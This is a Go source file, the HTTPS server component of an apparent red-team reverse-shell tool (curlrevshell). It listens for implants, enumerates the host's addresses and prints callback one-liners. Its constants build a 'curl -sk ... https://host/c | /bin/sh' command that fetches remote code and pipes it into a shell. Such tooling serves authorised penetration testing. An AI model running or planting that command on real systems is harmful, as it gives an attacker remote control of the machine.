// Package hsrv - HTTP server
package hsrv

/*
 * hsrv.go
 * HTTP server
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240520
 */

import (
	"cmp"
	"context"
	"errors"
	"fmt"
	"log"
	"log/slog"
	"net"
	"net/http"
	"net/netip"
	"slices"
	"strconv"
	"strings"
	"sync"
	"text/template"

	"github.com/magisterquis/curlrevshell/lib/opshell"
	"github.com/magisterquis/curlrevshell/lib/sstls"
)

const (
	// CurlFormat prints the start of the curl command used to connect
	// to us.
	CurlFormat = `curl -sk --pinnedpubkey sha256//%s https://%s`

	// FileSuffix is added to CurlFormat when telling the user how to get
	// a file.
	FileSuffix = ""

	// ShellSuffix is added to CurlFormat when telling the user haw to get
	// a shell.
	ShellSuffix = "/c | /bin/sh"
)

// Log messages and keys.
const (
	LMListening = "Listener started"

	LKError      = "error"
	LKListenAddr = "address"
)

// ErrOneShellClosed indicates that the listener was closed as expected after
// receiving a single shell.
var ErrOneShellClosed = errors.New("closed after shell received")

// Server serves implants over HTTPS.
type Server struct {
	sl       *slog.Logger
	fdir     string /* Static files directory. */
	ich      <-chan string
	och      chan<- opshell.CLine
	l        sstls.Listener
	ps       pinkSender
	oneShell bool /* Close listener after getting a shell. */

	/* Template generation. */
	tmplf   string             /* Template file. */
	defTmpl *template.Template /* Default template, for testing. */

	/* Used for making sure we don't get mismatched input and output. */
	curIDL   sync.Mutex
	curIDIn  string      /* Current Implant ID, for shell input. */
	curIDOut string      /* Current Implant ID, for shell output. */
	stopIn   func(error) /* Stops the Input handler. */

	/* Things for printing help. */
	cbAddrs   []string
	lAddrs    []string /* Listen addresses, for help. */
	cbHelp    string   /* Callback help text. */
	printIPv6 bool
}

// New returns a new Server, listening on addr.  Call its Do method to start it
// serving.  Call the returned cleanup function to deallocate resources
// allocated by New.  Static files will be served from fdir, if non-empty.  If
// tmplf is non-empty, it is taken as a file from which to read the callback
// template.
func New(
	sl *slog.Logger,
	addr string,
	fdir string,
	tmplf string,
	ich <-chan string,
	och chan<- opshell.CLine,
	certFile string,
	cbAddrs []string, /* Callback addresses, for one-liners. */
	printIPv6 bool,
	oneShell bool, /* Shut down listener after first shell. */
) (*Server, func(), error) {
	var l sstls.Listener

	/* cleanup closes the listener. */
	cleanup := func() {
		if nil != l.Listener {
			l.Close()
		}
	}

	/* Make sure the listen address has a port, and if not ask the OS to
	choose one for us. */
	if _, p, err := net.SplitHostPort(addr); "" == p || nil != err {
		addr = net.JoinHostPort(addr, "0")
	}

	/* Start our listener. */
	var err error
	if l, err = sstls.Listen("tcp", addr, "", 0, certFile); nil != err {
		return nil, nil, fmt.Errorf("listening on %s: %w", addr, err)
	}
	sl.Info(LMListening, LKListenAddr, l.Addr().String())

	/* Server to return. */
	s := &Server{
		sl:        sl,
		fdir:      fdir,
		ich:       ich,
		och:       och,
		l:         l,
		ps:        pinkSender{och},
		tmplf:     tmplf,
		defTmpl:   parsedDefaultTemplate,
		cbAddrs:   cbAddrs,
		printIPv6: printIPv6,
		oneShell:  oneShell,
	}

	/* Work out our listen addresses, for user help. */
	if s.lAddrs, err = s.listenAddresses(); nil != err {
		cleanup()
		return nil, nil, fmt.Errorf(
			"determining listen addresses: %w",
			err,
		)
	}
	if 0 == len(s.lAddrs) {
		cleanup()
		return nil, nil, errors.New("no listen addresses")
	}

	/* Help text for user getting a callback. */
	sb := new(strings.Builder)
	sb.WriteRune('\n')
	for _, la := range s.lAddrs {
		fmt.Fprintf(
			sb,
			CurlFormat+ShellSuffix+"\n",
			s.l.Fingerprint,
			la,
		)
	}
	sb.WriteRune('\n')
	s.cbHelp = sb.String()

	return s, cleanup, nil
}

// Do actually serves HTTPS clients.
func (s *Server) Do(ctx context.Context) error {
	/* Set up a server. */
	hsvr := http.Server{
		Handler:  s.newMux(),
		ErrorLog: log.New(s.ps, "Server error: ", log.Lmsgprefix),
		BaseContext: func(_ net.Listener) context.Context {
			return ctx
		},
	}
	s.Logf(opshell.ColorNone, "Listening on %s", s.l.Addr())

	/* Tell user where to get static files. */
	if "" != s.fdir && 0 != len(s.lAddrs) {
		s.Logf(ScriptColor, "To get files from %s:", s.fdir)
		s.Printf(ScriptColor, "\n")
		for _, a := range s.lAddrs {
			s.Printf(
				ScriptColor,
				CurlFormat+FileSuffix,
				s.l.Fingerprint,
				a,
			)
		}
		s.Printf(ScriptColor, "\n")
	}

	/* Tell user how to get a callback. */
	s.printCallbackHelp()

	/* Serve until we fail or the context is cancelled. */
	var ech = make(chan error, 1)
	go func() {
		err := hsvr.Serve(s.l)
		/* If we're only running a single shell, a closed listener is
		to be expected. */
		if errors.Is(err, net.ErrClosed) && s.oneShell {
			err = ErrOneShellClosed
		}
		ech <- err
	}()
	var err error
	select {
	case err = <-ech:
	case <-ctx.Done():
	}

	/* Shutdown the server. */
	serr := hsvr.Shutdown(ctx)

	/* Return the first non-nil error. */
	return cmp.Or(err, serr)
}

// listenAddresseses gets all of the addresses we have for the box.
func (s *Server) listenAddresses() ([]string, error) {
	var addrs []string

	/* Parse the listen address and port, which we'll need for
	manually-added callback addresses. */
	ls := s.l.Addr().String()
	ap, err := netip.ParseAddrPort(ls)
	if nil != err {
		return nil, fmt.Errorf(
			"parsing listen address %s: %w",
			ls,
			err,
		)
	}
	port := strconv.Itoa(int(ap.Port()))

	/* Add extra addresses, for just in case. */
	for _, a := range s.cbAddrs {
		/* Make sure we have a port. */
		if _, p, err := net.SplitHostPort(a); "" == p || nil != err {
			a = net.JoinHostPort(a, port)
		}
		addrs = append(addrs, a)
	}

	/* If the listen address isn't a wildcard address, we're good with
	just i. */
	if !ap.Addr().IsUnspecified() {
		return sortAddresses(append(addrs, ap.String())), nil
	}

	/* Get all the addresses we know about. */
	nifs, err := net.Interfaces()
	if nil != err {
		return nil, fmt.Errorf("enumerating interfaces: %w", err)
	}
	for _, nif := range nifs {
		/* Dont print loopback addresses. */
		if 0 != net.FlagLoopback&nif.Flags {
			continue
		}
		/* Get this interface's addresses. */
		ifas, err := nif.Addrs()
		if nil != err {
			s.ErrorLogf(
				"Error getting addresses for %s: %s",
				nif.Name,
				err,
			)
			continue
		}
		/* Keep hold of each address on this interface. */
		for _, ifa := range ifas {
			ps := ifa.String()
			/* If we have a netmask, remove it. */
			p, err := netip.ParsePrefix(ps)
			if nil != err {
				s.ErrorLogf(
					"Error parsing "+
						"callback address %s: %s",
					ps,
					err,
				)
				continue
			}
			/* If it's IPv6, make sure we want it. */
			if p.Addr().Is6() && !s.printIPv6 {
				continue
			}
			/* Save the address with the listen port. */
			addrs = append(addrs, net.JoinHostPort(
				p.Addr().String(),
				port,
			))
		}
	}
	addrs = sortAddresses(addrs)

	/* If we haven't any addresses by this point, something's wrong. */
	if 0 == len(addrs) {
		return nil, fmt.Errorf("no interfaces have addresses")
	}

	return addrs, nil
}

// printCallbackHelp prints a friendly message to the user instructing him how to
// get a callback.
func (s *Server) printCallbackHelp() {
	/* Tell the user how to get a callback. */
	s.Logf(ScriptColor, "To get a shell:")
	s.Printf(ScriptColor, "%s", s.cbHelp)
}

// sortAddresses sorts a slice of addresses as string.  Non-IP:Port pairs come
// first, sorted lexicographically, then come IP addresses, sorted as per
// netip.AddrPort.Compare.  The returned slice is deduped via slices.Compact..
func sortAddresses(as []string) []string {
	slices.SortFunc(as, func(a, b string) int {
		/* If either both address are addresses or both aren't sort
		as normal. */
		aa, ea := netip.ParseAddrPort(a)
		ab, eb := netip.ParseAddrPort(b)
		if ea == nil && eb == nil {
			return aa.Compare(ab)
		} else if ea != nil && eb != nil {
			return strings.Compare(a, b)
		}
		/* Failing that, non-IP addresses sort before normal addreses,
		as they're likely what we were asked to print. */
		if ea == nil && eb != nil {
			return 1
		} else if ea != nil && eb == nil {
			return -1
		}
		/* Unpossible. */
		return 0
	})
	return slices.Compact(as)
}
